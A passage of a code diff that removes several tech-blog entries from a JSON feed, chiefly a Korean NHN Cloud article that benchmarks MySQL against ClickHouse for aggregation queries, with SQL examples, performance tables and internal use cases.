@@ -2,94 +2,6 @@
   {
     "id": 1,
     "imageUrl": "",
-    "title": "Make Your Plugin Remote Development-Ready",
-    "description": "Remote development is changing how plugins should be built for JetBrains IDEs. The IDE is no longer a single local process: users interact with a frontend client, while the backend can run on another machine, in Docker, or in the cloud. This model is becoming increasingly important because it supports powerful remote environments, better security, […]",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://blog.jetbrains.com/platform/2026/05/make-your-plugin-remote-development-ready/",
-    "pubDate": "Thu, 07 May 2026 12:00:15 +0000",
-    "creator": "Nikita Katkov",
-    "categories": [
-      "plugin-development",
-      "remote-development",
-      "split-mode"
-    ]
-  },
-  {
-    "id": 2,
-    "imageUrl": "",
-    "title": "Scaling ArchUnit with Nebula ArchRules",
-    "description": "No description available",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://netflixtechblog.com/scaling-archunit-with-nebula-archrules-b4642c464c5a?source=rss----2615bd06b42e---4",
-    "pubDate": "Fri, 08 May 2026 15:55:59 GMT",
-    "creator": "Netflix Technology Blog",
-    "categories": [
-      "gradle",
-      "nebula",
-      "java",
-      "archunit"
-    ]
-  },
-  {
-    "id": 3,
-    "imageUrl": "",
-    "title": "MySQL 3분 vs ClickHouse 0.3초 — 같은 쿼리입니다",
-    "description": "[![NHN Cloud_meetup banner_CH_202605_900.png](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20bannerCH202605900.png)](https://www.nhncloud.com/kr)\r\r\n\r\r\n## 들어가며\r\r\n\r\r\n최근 MySQL 기반 서비스들로부터 ClickHouse 도입 문의를 받으면서 직접 검토하고 도입하게 되었습니다.\r\r\n실제 운영 중인 서비스에 적용하며 성능을 확인할 수 있었고, 기술과 경험을 공유하고자 글을 작성했습니다.\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse란?\r\r\n\r\r\n[ClickHouse](https://clickhouse.com/)는 데이터를 빠르게 읽기 위해 만들어진 데이터베이스입니다.\r\r\nMySQL은 행(Row) 단위로 데이터를 저장하고, ClickHouse는 열(Column) 단위로 데이터를 저장합니다.\r\r\n\r\r\n행 단위 DBMS는 데이터를 블록 단위로 저장하고 읽기 때문에 일부 열만 필요한 쿼리라도 해당 행 전체 블록을 메모리에 올려야 합니다. 즉, 불필요한 열 데이터까지 I/O가 발생합니다.\r\r\n\r\r\n![NHN Cloud_meetup diagram_clickHouse_01.gif](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20diagramclickHouse01.gif)\r\r\n(source: [https://clickhouse.com/docs/intro](https://clickhouse.com/docs/intro))\r\r\n\r\r\n\r\r\n반면 열 단위 DBMS는 열 단위로 데이터를 순차 저장하기 때문에 쿼리에 필요한 열만 선택적으로 읽을 수 있어 불필요한 I/O를 방지하고 분석 쿼리 성능이 크게 향상됩니다.\r\r\n\r\r\n![NHN Cloud_meetup diagram_clickHouse_02.gif](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20diagramclickHouse02.gif)\r\r\n(source: [https://clickhouse.com/docs/intro](https://clickhouse.com/docs/intro))\r\r\n\r\r\n\r\r\n![NHN Cloud_meetup diagram_clickHouse_03_900.png](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20diagramclickHouse03900.png)\r\r\n\r\r\n따라서 SUM, COUNT, AVG 같은 집계 쿼리를 실행할 때 MySQL은 모든 열을 읽어야 하지만 ClickHouse는 필요한 열만 읽기 때문에 대량 데이터 조회에서 빠른 성능을 냅니다.\r\r\n\r\r\n\r\r\n\r\r\n## MySQL의 한계, 그리고 ClickHouse\r\r\n\r\r\nMySQL은 트랜잭션, 단건 조회/수정/삭제 작업에 현재도 널리 사용됩니다. 다만, 한계가 있습니다.\r\r\n\r\r\n### MySQL이 한계를 보이는 순간\r\r\n\r\r\n데이터가 수천만 건을 넘어가면서 집계 쿼리 하나가 30초, 1분, 그리고 타임아웃으로 이어지기도 합니다. 인덱스를 아무리 잘 잡아도, 읽어야 할 데이터 자체가 너무 많으면 성능 개선이 어렵습니다. MySQL은 행(Row) 단위로 저장하기 때문에 `SUM(amount)` 하나를 구하려 해도 모든 칼럼을 통째로 읽어야 해서 느립니다. 데이터가 쌓일수록 이 문제는 피할 수 없습니다.\r\r\n\r\r\n\r\r\n\r\r\n### ClickHouse가 돌파한 지점\r\r\n\r\r\n| MySQL의 한계 | ClickHouse의 해결 |\r\r\n| --- | --- |\r\r\n| 집계 쿼리 = 전체 행 풀스캔 | 필요한 칼럼만 읽는 열 저장 구조 |\r\r\n| 인덱스로 한계, 수억 건은 답 없음 | 파티션 + 정렬 키로 읽는 범위 자체를 줄임 |\r\r\n| 무거운 쿼리 1개가 전체 DB 영향 | 병렬 처리로 쿼리 간 간섭 없음 |\r\r\n| 대용량 적재 시 성능 저하 | 배치 INSERT에 최적화된 구조 |\r\r\n| 저장 공간 그대로 | 열 단위 압축으로 용량 80% 이상 절감 |\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse를 다루는 올바른 이해\r\r\n\r\r\n다만, MySQL을 사용하듯이 ClickHouse를 사용하면 오히려 MySQL보다 느리거나 데이터가 기대와 다르게 동작할 수 있습니다. ClickHouse를 단순히 \"빠른 MySQL\"로 이해해서는 안 됩니다. \r\r\n\r\r\n두 DB는 해결하려는 문제가 다르므로 이 차이를 이해하고 사용해야 효과적으로 운영할 수 있습니다.\r\r\n\r\r\n\r\r\n\r\r\n### OLTP vs OLAP — 설계 철학이 다릅니다\r\r\n\r\r\n| 구분 | OLTP | OLAP |\r\r\n| --- | --- | --- |\r\r\n| 대표 DB | MySQL, PostgreSQL | ClickHouse, BigQuery |\r\r\n| 주요 작업 | 단건 조회, INSERT/UPDATE/DELETE, 트랜잭션 | 대량 집계, 통계, 분석 |\r\r\n| 최적화 방향 | 정합성, 트랜잭션 보장 | 빠른 읽기, 압축, 처리량 |\r\r\n| 저장 단위 | 행(Row) | 열(Column) |\r\r\n| 설계 철학 | \"1건도 틀리면 안 된다\" | \"1억 건을 빠르게 본다\" |\r\r\n\r\r\n\r\r\n\r\r\nOLTP는 트랜잭션 처리에 최적화된 설계입니다. ACID(원자성·일관성·격리성·지속성)를 보장하며, 결제 도중 오류가 나면 전체가 롤백 되고 데이터는 항상 일관된 상태를 유지합니다. 단건 조회·수정·삭제처럼 \"1건도 틀리면 안 된다\"라는 워크로드에 적합합니다.\r\r\n\r\r\nOLAP는 분석 처리에 최적화된 설계입니다. 트랜잭션과 같은 다중 테이블 정합성 보장은 설계 범위 밖이며, 수십억\\~수조 개의 행을 빠르게 읽고 집계하는 것에 집중합니다. \"1억 건을 빠르게 본다\"라는 워크로드에 적합합니다.\r\r\n\r\r\nMySQL은 OLTP DB이며, 트랜잭션 정합성과 단건 처리에 최적화되어 있습니다.\r\r\nClickHouse는 OLAP DB이며, 모든 설계가 \"대량 데이터를 빠르게 읽는다\"라는 목표에 맞춰져 있습니다.\r\r\n\r\r\n**두 DB는 경쟁 관계가 아닙니다. 정합성이 절대적인 트랜잭션 워크로드는 MySQL이, 대량 데이터를 빠르게 집계·분석하는 워크로드는 ClickHouse가 맡는 구조로 함께 사용하는 것이 올바른 접근입니다.**\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse 적합 케이스\r\r\n\r\r\n이런 상황이면 ClickHouse가 효과적입니다.\r\r\n\r\r\n| 상황 | 예시 |\r\r\n| --- | --- |\r\r\n| 대량 데이터의 집계/통계 조회 | 일별/월별 매출 합산, 사용자 행동 분석 |\r\r\n| 데이터가 계속 쌓이는 로그성 테이블 | 이벤트 로그, 결제 이력, 접속 기록 |\r\r\n| 특정 칼럼만 골라서 분석하는 쿼리 | `SELECT SUM(amount) WHERE date BETWEEN ...` |\r\r\n\r\r\n아래 쿼리 패턴을 사용한다면 ClickHouse에서 성능을 확인할 수 있습니다.\r\r\n\r\r\n\r\r\n\r\r\n**패턴 1 - 날짜 범위 + 집계**\r\r\n\r\r\n```\r\r\n-- AS-IS: MySQL에서 30초 이상 걸리던 쿼리\r\r\nSELECT DATE(created_at) AS day, COUNT(*) AS cnt, SUM(amount) AS total\r\r\nFROM orders\r\r\nWHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'\r\r\nGROUP BY day\r\r\nORDER BY day;\r\r\n\r\r\n-- TO-BE: ClickHouse로 이관 → 1초 이내\r\r\n-- 구조 동일\r\r\n```\r\r\n\r\r\n 적용 추천: 일별/월별 리포트, 대시보드 통계\r\r\n\r\r\n\r\r\n\r\r\n**패턴 2 - 특정 조건 필터 후 대용량 COUNT**\r\r\n\r\r\n```\r\r\n-- 수천만 건 테이블에서 특정 상태값 집계\r\r\nSELECT status, COUNT(*) AS cnt\r\r\nFROM user_events\r\r\nWHERE created_at >= '2024-06-01'\r\r\nGROUP BY status;\r\r\n```\r\r\n\r\r\n 적용 추천: 사용자 행동 분석, 이벤트 로그 집계\r\r\n\r\r\n\r\r\n\r\r\n**패턴 3 - 다중 그룹핑 통계**\r\r\n\r\r\n```\r\r\n-- 서비스별 + 날짜별 + 타입별 3중 집계\r\r\nSELECT service_id, DATE(created_at), event_type, SUM(amount)\r\r\nFROM transaction_log\r\r\nWHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'\r\r\nGROUP BY service_id, DATE(created_at), event_type;\r\r\n```\r\r\n\r\r\n 적용 추천: 정산, 정기 리포트, 매출 분석\r\r\n\r\r\n\r\r\n\r\r\n## ClickHouse 부적합 케이스\r\r\n\r\r\nClickHouse가 맞지 않는 패턴도 확인해야 합니다. 다음과 같은 상황에서는 MySQL을 그대로 사용하는 것을 권장합니다.\r\r\n\r\r\n\r\r\n\r\r\n### 1. 단건 조회/단건 INSERT\r\r\n\r\r\n```\r\r\nSELECT * FROM users WHERE user_id = 12345;\r\r\n```\r\r\n\r\r\n앞서 살펴본 바와 같이 ClickHouse는 데이터를 열(Column) 단위로 저장합니다. 열 저장 구조는 같은 타입의 데이터가 연속으로 모여 있어야 압축도 잘 되고 집계도 빠릅니다. 반대로 단건 조회는 `id, name, age, amount`처럼 서로 다른 칼럼을 각각 따로 찾아서 조합해야 합니다. 열이 흩어져 있으니 오히려 더 많은 I/O가 발생합니다.\r\r\n\r\r\nINSERT도 마찬가지입니다. ClickHouse는 대량 배치 INSERT에 최적화되어 있습니다. 열 단위로 데이터를 모아서 한꺼번에 압축 저장하기 때문에 건별 INSERT는 비효율적입니다. 1건씩 INSERT하면 매번 새로운 파트(Part)가 생성되어 오히려 성능이 크게 저하됩니다.\r\r\n\r\r\n즉 ClickHouse는 \"많이 모아서 한 번에\"에 특화된 DB이며, 단건 조회/INSERT처럼 \"하나씩 처리\"하는 패턴에는 MySQL이 적합합니다.\r\r\n\r\r\n\r\r\n\r\r\n### 2. 트랜잭션(결제, 주문 등)\r\r\n\r\r\n```\r\r\nBEGIN;\r\r\nUPDATE orders SET status = 'paid' WHERE order_id = 999;\r\r\nUPDATE stock SET quantity = quantity - 1 WHERE item_id = 1;\r\r\nCOMMIT;\r\r\n```\r\r\n\r\r\nClickHouse는 트랜잭션을 지원하지 않습니다. 이는 ClickHouse가 의도적으로 선택한 트레이드오프입니다. 속도를 얻기 위해 정확도(정합성)를 일부 포기한 설계입니다. MySQL은 ACID(원자성·일관성·격리성·지속성)를 보장해 결제 도중 오류가 나면 전체가 롤백 되고, 데이터는 항상 일관된 상태를 유지합니다. ClickHouse는 이 복잡한 정합성 보장 대신 \"빠르게 많이 쓰고, 빠르게 많이 읽는다\"에 집중했습니다. 덕분에 수천만\\~수억 건의 집계를 초 단위로 처리할 수 있습니다.\r\r\n\r\r\n결제, 주문처럼 \"틀리면 안 되는\" 작업은 MySQL, 통계, 분석처럼 \"빠르게 봐야 하는\" 작업은 ClickHouse를 사용하면 효과적입니다.\r\r\n\r\r\n\r\r\n\r\r\n### 3. 빈번한 UPDATE/DELETE\r\r\n\r\r\n```\r\r\nUPDATE orders SET status = 'cancel' WHERE order_id = 999;\r\r\nDELETE FROM logs WHERE created_at < '2023-01-01';\r\r\n```\r\r\n\r\r\nClickHouse에서 UPDATE/DELETE는 동작 구조가 MySQL과 다릅니다.\r\r\n\r\r\n\r\r\n\r\r\n**UPDATE**\r\r\n\r\r\n→ `ReplacingMergeTree` 엔진으로 대체 동일 키로 새 데이터를 INSERT 하면 백그라운드에서 중복을 제거하는 방식입니다.\r\r\n\r\r\n→ 즉시 반영이 안 되고 Merge 타이밍에 처리됩니다.\r\r\n\r\r\n**DELETE**\r\r\n\r\r\n→ `Mutation`으로 동작(`ALTER TABLE ... DELETE WHERE ...`)\r\r\n\r\r\n→ 해당 파트를 통째로 재작성하는 방식이므로 처리 비용이 크고 속도가 느립니다. 소량 건별 삭제에는 부적합합니다.\r\r\n\r\r\n\r\r\n\r\r\n기술적으로 불가능한 것은 아니지만, 빈번한 단건 UPDATE/DELETE에는 설계 자체가 맞지 않습니다. 이런 패턴은 MySQL이 적합합니다.\r\r\n\r\r\n\r\r\n\r\r\n## MySQL vs ClickHouse 성능 테스트 비교\r\r\n\r\r\n이 테스트는 \"ClickHouse가 잘하는 영역(집계, 대용량 분석)에서 실제로 얼마나 차이가 나는지\"를 확인하기 위한 목적으로 진행했습니다. 앞서 설명한 대로 두 DB는 경쟁 관계가 아니라 역할이 다릅니다. ClickHouse의 도입 필요성을 판단하기 위한 참고 수치로 활용하시기 바랍니다. 실제 도입 시에는 서비스의 쿼리 패턴에 맞는 스키마와 정렬 키 설계가 선행되어야 합니다.\r\r\n\r\r\n\r\r\n\r\r\n**1. 서버 스펙**\r\r\n\r\r\n| 항목 | MySQL 서버 | ClickHouse 서버 | 비고 |\r\r\n| --- | --- | --- | --- |\r\r\n| CPU | 16코어 | 16코어 | taskset으로 동일하게 맞춤 |\r\r\n| MEM(RAM) | 64GB | 64GB | 동일 |\r\r\n| 디스크 | HDD 8.7TB | HDD 1TB | 타입 동일 |\r\r\n\r\r\n**2. 테스트 조건**\r\r\n\r\r\n| 항목 | 내용 |\r\r\n| --- | --- |\r\r\n| 데이터 | 5,000만 건 이벤트 로그(6개 칼럼) |\r\r\n| 측정 방식 | 3회 반복 측정 후 중간값 채택 |\r\r\n| 데이터 범위 | 2023-01-01 \\~ 2024-12-31(2년치) |\r\r\n\r\r\n**3. 테스트 테이블 스키마**\r\r\n\r\r\nMySQL은 구조상 PK가 필수이며, 행을 유일하게 식별하는 고유 식별자로 동작합니다.\r\r\n\r\r\nClickHouse의 PK는 개념이 다릅니다. ORDER BY로 지정한 정렬 키가 PK 역할을 하며, 고유성 보장이 아닌 데이터 탐색 범위를 줄이기 위한 용도로 사용됩니다.\r\r\n\r\r\n```\r\r\n-- MySQL\r\r\nCREATE TABLE IF NOT EXISTS events (\r\r\n    id          BIGINT AUTO_INCREMENT PRIMARY KEY,\r\r\n    user_id     BIGINT NOT NULL,\r\r\n    service_id  INT NOT NULL,\r\r\n    event_type  VARCHAR(20) NOT NULL,\r\r\n    amount      DECIMAL(15,2) NOT NULL,\r\r\n    status      VARCHAR(10) NOT NULL,\r\r\n    created_at  DATETIME NOT NULL,\r\r\n    PRIMARY KEY (`id`),\r\r\n    INDEX idx_created_at_service_event (created_at, service_id, event_type)\r\r\n    -- MySQL은 구조상 PK가 필수이기 때문에 id 칼럼을 PK로 두되, ClickHouse의 ORDER BY 정렬 키와 동일한 구성으로 복합 인덱스를 별도 생성하여 조건을 맞춤\r\r\n) ENGINE=InnoDB;\r\r\n\r\r\n\r\r\n-- ClickHouse\r\r\nCREATE TABLE events (\r\r\n    id          UInt64,\r\r\n    user_id     UInt64,\r\r\n    service_id  UInt32,\r\r\n    event_type  LowCardinality(String),\r\r\n    amount      Decimal(15,2),\r\r\n    status      LowCardinality(String),\r\r\n    created_at  DateTime\r\r\n)\r\r\nENGINE = MergeTree()\r\r\nORDER BY (created_at, service_id, event_type);\r\r\n-- ORDER BY = 정렬 키. 쿼리 필터 조건과 맞출수록 성능 향상\r\r\n```\r\r\n\r\r\n\r\r\n\r\r\n같은 데이터, 같은 쿼리이지만 결과는 달랐습니다.\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 1. 집계 쿼리 속도(핵심)\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 A: GROUP BY 단일 — 월별 금액 합산**\r\r\n\r\r\n```\r\r\nSELECT DATE_FORMAT(created_at, '%Y-%m'), SUM(amount)\r\r\nFROM events\r\r\nGROUP BY 1 ORDER BY 1;\r\r\n```\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 49초 | 0.2초 | 약 245배 빠름 |\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 B: GROUP BY 다중 — 서비스별 + 날짜별 + 타입별 3중 집계**\r\r\n\r\r\n```\r\r\nSELECT service_id, DATE(created_at), event_type, COUNT(*), SUM(amount)\r\r\nFROM events\r\r\nWHERE created_at BETWEEN '2024-01-01' AND '2024-12-31'\r\r\nGROUP BY 1, 2, 3;\r\r\n```\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 208초(=3분28초) | 0.3초 | 약 693배 빠름 |\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 C: COUNT — 조건부 카운트 + DISTINCT**\r\r\n\r\r\n```\r\r\nSELECT event_type, status,\r\r\n       COUNT(*), COUNT(DISTINCT user_id), SUM(IF(amount > 50000, 1, 0))\r\r\nFROM events\r\r\nWHERE created_at BETWEEN '2024-06-01' AND '2024-12-31'\r\r\nGROUP BY event_type, status;\r\r\n```\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 67초 | 0.2초 | 약 335배 빠름 |\r\r\n\r\r\n\r\r\n\r\r\n**쿼리 D: MySQL View vs ClickHouse View**\r\r\n\r\r\n| 항목 | MySQL View | ClickHouse View | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 94초 | 0.398초 | 약 236배 빠름 |\r\r\n\r\r\nClickHouse는 MySQL과 마찬가지로 VIEW를 제공합니다. 원리는 같지만, ClickHouse는 데이터를 열(column) 단위로 저장하는 구조 덕분에 집계 쿼리 시 필요한 열만 읽어 I/O를 최소화합니다. 같은 VIEW 개념임에도 MySQL 대비 약 236배 빠른 성능을 보입니다.\r\r\n\r\r\n\r\r\n\r\r\n**추가: ClickHouse Materialized View 활용**\r\r\n\r\r\n| 항목 | ClickHouse View | ClickHouse Materialized View | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 실행 시간 | 0.398초 | 0.1초 | 약 4배 빠름 |\r\r\n\r\r\nClickHouse에서 성능을 더 끌어올리고 싶다면 Materialized View(MV)를 활용할 수 있습니다.\r\r\n\r\r\n일반 View가 조회 시점마다 원본 테이블을 다시 읽는 반면, MV는 데이터가 INSERT 될 때 집계를 미리 계산해 별도 테이블에 저장합니다.\r\r\n\r\r\n조회 시에는 이미 집계된 결과를 바로 반환하기 때문에 0.398초 → 0.1초로 추가 단축됩니다. 대시보드처럼 동일한 집계를 반복 조회하는 서비스에 특히 효과적입니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 2. 동시 요청 처리(집계 쿼리 10개 동시 실행)\r\r\n\r\r\n| 항목 | MySQL | ClickHouse |\r\r\n| --- | --- | --- |\r\r\n| 최소 응답시간 | 약 48초 | 약 0.3초 |\r\r\n| 최대 응답시간 | 약 48초 | 약 0.9초 |\r\r\n| 평균 응답시간 | 약 48초 | 약 0.9초 |\r\r\n\r\r\nMySQL과 달리 ClickHouse는 병렬 처리 구조로 10개 동시 요청도 안정적으로 응답합니다.\r\r\nMySQL은 동시 요청 10개에 48초, ClickHouse는 0.9초. 같은 쿼리입니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 3. 저장 용량(압축률)\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 절감 |\r\r\n| --- | --- | --- | --- |\r\r\n| 5,000만 건 데이터 용량 | 5.6GB | 2.6GB | 약 54% |\r\r\n\r\r\nClickHouse는 열(column) 단위 저장 + LZ4 압축 덕분에 같은 데이터를 훨씬 작게 저장합니다.\r\r\n스토리지 비용 절감은 물론, 디스크 I/O가 줄어 쿼리 속도에도 직접 영향을 줍니다.\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 4. INSERT 속도(대량 적재)\r\r\n\r\r\n| 항목 | MySQL | ClickHouse | 차이 |\r\r\n| --- | --- | --- | --- |\r\r\n| 5,000만 건 적재 시간 | 849초(14분) | 49초 | 약 17배 빠름 |\r\r\n\r\r\nMySQL은 약 14분, ClickHouse는 1분 이내에 완료되었습니다.\r\r\nMySQL은 행 단위로 데이터를 즉시 디스크에 쓰고 인덱스를 갱신하지만, ClickHouse는 데이터를 메모리에 모아 열 단위로 일괄 압축한 뒤 디스크에 한 번에 씁니다. 여기에 멀티 코어 병렬 처리까지 더해져 대량 적재에서 빠른 속도를 냅니다.\r\r\n\r\r\n\r\r\n\r\r\n### 테스트 5. MySQL 호환성\r\r\n\r\r\n| 검증 항목 | MySQL 문법 그대로 CH에서 실행 | 결과 일치 |\r\r\n| --- | --- | --- |\r\r\n| DATE\\_FORMAT, 날짜 함수 | 동작 | 일치 |\r\r\n| IF / CASE WHEN | 동작 | 일치 |\r\r\n| LIKE / IN / BETWEEN | 동작 | 일치 |\r\r\n| HAVING + 서브쿼리 | 동작 | 일치 |\r\r\n| MySQL Client(포트 7004) 접속 | 접속 성공 | \\- |\r\r\n\r\r\n동일 문법, 동일 결과로 쿼리 동일성을 검증했습니다.\r\r\nMySQL에 익숙하다면, ClickHouse 쿼리 문법 자체에 대한 진입 장벽은 낮습니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n## NHN Cloud의 ClickHouse 활용 케이스\r\r\n\r\r\n### 1. Notification Hub\r\r\n\r\r\nNHN Cloud의 [Notification Hub](https://www.nhncloud.com/kr/service/notification/notification-hub)는 SMS, Email, Push 등 다양한 채널로 메시지를 발송·관리하는 통합 메시징 서비스입니다.\r\r\n\r\r\n카카오 비즈센터에서 제공하는 통계 API는 다양한 검색 조건으로 통계를 조회하는 기능을 제공하지 않습니다.\r\r\n\r\r\n이에 따라 카카오 비즈센터의 전체 통계 데이터를 ClickHouse에 저장한 뒤, Notification Hub 고객에게 다양한 검색 조건으로 통계를 조회할 수 있도록 제공하는 구조로 구성했습니다. 이는 Notification Hub 전체 발송 통계에 ClickHouse를 적용하기 앞서, 서비스 안정성을 검증하기 위한 PoC(proof of concept, 개념 증명) 목적으로 카카오 통계에 먼저 도입했습니다.\r\r\n\r\r\nClickHouse 도입 후 달라진 점은 크게 네 가지입니다.\r\r\n\r\r\n> **1\\) 적재 파이프라인 단순화** - MySQL에서 필요했던 사전 전처리·병합 과정이 사라지고, raw 데이터를 그대로 적재하는 단순한 구조로 바뀌었습니다.\r\r\n>\r\r\n> **2\\) 데이터 보정 편의성 향상** - ReplacingMergeTree 엔진을 활용해 멱등성을 보장합니다. 기존 데이터를 삭제하지 않고도 보정 데이터를 추가할 수 있고, 중복 적재가 발생해도 문제가 없습니다.\r\r\n>\r\r\n> **3\\) 누락 데이터 확인 용이** - 병합 전 raw 데이터가 그대로 쌓이기 때문에, 어떤 데이터가 누락됐는지 훨씬 빠르게 파악할 수 있습니다.\r\r\n>\r\r\n> **4\\) 조회 성능 향상** - 1,000만 건 이상의 데이터에 다양한 필터 조건으로 집계 쿼리를 수행했을 때 356ms 수준의 응답 속도를 확인했습니다. 사전 전처리 없이 조회 시점에 집계하는 방식으로도 충분히 서비스를 제공할 수 있음을 검증했습니다. 카카오 통계 PoC를 통해 안정성과 성능을 확인한 만큼, 이후 Notification Hub 전체 발송 통계로의 확대 적용도 검토 중입니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n### 2. Cab-Verify\r\r\n\r\r\nCAB은 NHN Cloud의 상품·프로젝트 라이프사이클 등을 관리하는 Framework이며, Cab-Verify는 CAB에서 사용하는 인증을 관리하는 서비스입니다. 현재 최대 1억 건의 토큰 인증 이력을 보관하고 있으며, CAB 7.0 API 토큰 인증 의무화·도입 상품 수 증가·퍼블릭 API 확대로 향후 10억 건 이상으로 증가가 예상되는 상황이었습니다. \r\r\n\r\r\nMySQL로는 이 규모를 감당하기 어렵다는 판단 아래 ClickHouse 도입을 진행했습니다. 토큰 인증 이력 데이터를 ClickHouse에 적재하여 대규모 인증 이력 통계 조회를 고성능으로 처리하고, 향후 10억 건 규모로 확대되더라도 안정적인 조회 성능을 확보하는 것이 목표입니다.\r\r\n\r\r\n\r\r\n\r\r\n### 3. Resource Watcher\r\r\n\r\r\nNHN Cloud의 [Resource Watcher](https://www.nhncloud.com/kr/service/governance-audit/resource-watcher)는 NHN Cloud의 로그 플랫폼 개발팀에서 직접 ClickHouse를 도입하여 운영 중인 사례입니다. MySQL에서 반복적으로 발생하던 슬로 쿼리 문제를 ClickHouse로 해결한 경험을 공유해 주셨습니다.\r\r\n\r\r\nFramework에서는 하루 한 번 resource 목록을 배치로 조회하는 과정에서 Resource Watcher의 MySQL에 슬로 쿼리가 반복 발생했습니다. CPU 사용량이 95%를 초과하면서 MySQL이 헬스 체크(health check)에 응답하지 못하는 상황이 발생했고, 이로 인해 DB role change(failover, 장애 조치)가 발생할 위험이 있었습니다.\r\r\n\r\r\n배치 조회 트래픽을 ClickHouse로 분리하여 MySQL의 부하를 제거했습니다. 기존 API를 ClickHouse 기반 신규 API로 교체하고, 쿼리도 기존 3개에서 1개로 통합했습니다. 결과적으로 반복 발생하던 슬로 쿼리가 해소되었고, 배치 조회가 서비스 트래픽에 영향을 주지 않는 구조로 개선되었습니다.\r\r\n\r\r\n> **1\\) MySQL 슬로 쿼리 해소** - DB CPU 부하 및 장애 조치(failover) 위험을 제거했습니다.\r\r\n>\r\r\n> 2\\) 배치 조회와 서비스 트래픽의 DB 레벨 격리 - 배치와 서비스가 각각 다른 DB를 바라보도록 분리하여 서로 영향을 주지 않고 독립적으로 동작합니다.\r\r\n>\r\r\n> 3\\) 쿼리 구조 개선으로 조회 성능 향상 - LIMIT/OFFSET 쿼리 수행 시 발생하던 성능 문제가 개선되었습니다.\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n## 타사 ClickHouse 사용 사례\r\r\n최근에는 많은 기업들이 다양한 목적으로 ClickHouse를 도입해 사용하고 있습니다. 대표적인 사례를 소개합니다.\r\r\n\r\r\n\r\r\n| 회사 | 도입 목적 | 처리 규모 | 핵심 성과 |\r\r\n| --- | --- | --- | --- |\r\r\n| 카카오페이 증권 | 로그 플랫폼 전환 (OpenSearch → ClickHouse) | 일 41TB, 200억 건 로그 | 비용 85% 절감, 지연 20초 이내 |\r\r\n| 토스 | 랭킹 서비스 개선 | 인기 랭킹 시간당 1억 건 로그 | 실시간 랭킹 제공 (1초 미만 응답) |\r\r\n| SK텔레콤 | 고객 여정 데이터를 기반으로 한 사내 서비스 개선 | 2억 건 가량의 고객 행동 데이터 | 응답 10초 이내 |\r\r\n| Netflix | 대용량 로그 핫 티어 | 일 5PB, 초당 1,060만 이벤트 | 로그 생성 후 20초 이내 검색 가능 |\r\r\n| LINE Yahoo Japan | Kafka 인프라 모니터링 | 초당 700만 행 | 24대 서버로 전사 인프라 관측성 확보 |\r\r\n\r\r\n* [https://tech.kakaopay.com/post/pallas-v2-log-platform/](https://tech.kakaopay.com/post/pallas-v2-log-platform/)\r\r\n* [https://www.youtube.com/watch?v=8P2OL7cwFEU](https://www.youtube.com/watch?v=8P2OL7cwFEU)\r\r\n* [https://devocean.sk.com/blog/techBoardDetail.do?ID=167943\\&boardType=techBlog](https://devocean.sk.com/blog/techBoardDetail.do?ID=167943&boardType=techBlog)\r\r\n* [https://clickhouse.com/blog/netflix-petabyte-scale-logging](https://clickhouse.com/blog/netflix-petabyte-scale-logging)\r\r\n* [https://clickhouse.com/jp/blog/line-yahoo-jp](https://clickhouse.com/jp/blog/line-yahoo-jp)\r\r\n* [https://clickhouse.com/user-stories](https://clickhouse.com/user-stories)\r\r\n\r\r\n\r\r\n\r\r\n## 마치며\r\r\n지금까지 ClickHouse가 무엇인지, MySQL과 대비하여 구조적으로 어떻게 다르고 왜 빠른지 알아보았습니다. 나아가 설계 철학부터 다른 두 데이터베이스를 각각 어떤 케이스에 활용하면 적합한지 살펴보았고, 실제로 ClickHouse를 활용하는 사례들을 소개했습니다.\r\r\nMySQL의 집계 쿼리 성능 한계로 슬로 쿼리와 타임아웃을 자주 마주하시는 분들, ClickHouse에 관심이 있으시거나 도입을 고려하시는 분들 등 많은 분들께 도움이 되길 바라며 글을 마치겠습니다. 긴 글을 읽어 주셔서 감사합니다. \r\r\n\r\r\n\r\r\n[![NHN Cloud_meetup banner_footer_202509.png](https://image.toast.com/aaaadh/real/2026/techblog/NHN%20Cloudmeetup%20bannerfooter202509.png)](https://www.nhncloud.com/kr)",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://meetup.nhncloud.com/posts/414",
-    "pubDate": "Mon, 11 May 2026 00:12:36 GMT",
-    "creator": "Unknown",
-    "categories": []
-  },
-  {
-    "id": 4,
-    "imageUrl": "",
-    "title": "[MULTI] 눈은 호강하는데 심장이 뛰질 않아, 리플레이스드",
-    "description": "No description available",
-    "reviews": [],
-    "syllabus": [],
-    "link": "https://bbs.ruliweb.com/news/board/11/read/2449",
-    "pubDate": "Tue, 05 May 2026 13:18:54 +0900",
-    "creator": "(RULIWEB`Д')/",
-    "categories": [
-      "리뷰"
-    ]
-  },
-  {
-    "id": 5,
-    "imageUrl": "",
-    "title": "ODW #5: 벡터 DB와 에이전트 스킬로 RAG 시스템 만들기",
